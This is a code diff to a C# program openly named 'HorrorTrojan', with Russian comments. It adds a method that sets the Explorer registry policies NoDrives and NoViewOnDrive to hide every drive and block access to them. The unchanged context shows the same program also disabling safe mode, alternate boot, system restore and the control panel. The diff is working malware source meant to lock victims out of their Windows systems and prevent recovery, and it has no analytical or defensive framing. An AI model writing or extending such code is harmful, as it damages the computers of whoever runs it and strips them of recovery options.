@@ -16,6 +16,7 @@ namespace HorrorTrojan
             DisableSafeMode();
             DisableAlternateBoot();
             RemoveSystemRestore();
+            DisableDrives();
             
             // ===== ДОПОЛНИТЕЛЬНЫЕ БЛОКИРОВКИ =====
             DisableControlPanel();
@@ -104,7 +105,16 @@ namespace HorrorTrojan
             }
             catch { }
         }
-        
+
+        private static void DisableDrives()
+{
+    using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"))
+    {
+        key.SetValue("NoDrives", 0x03FFFFFF, RegistryValueKind.DWord);      // ← СКРЫВАЕТ ВСЕ ДИСКИ
+        key.SetValue("NoViewOnDrive", 0x03FFFFFF, RegistryValueKind.DWord); // ← ЗАПРЕЩАЕТ ПРОСМОТР
+    }
+        }
+
         private static void DisableControlPanel()
         {
             using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"))
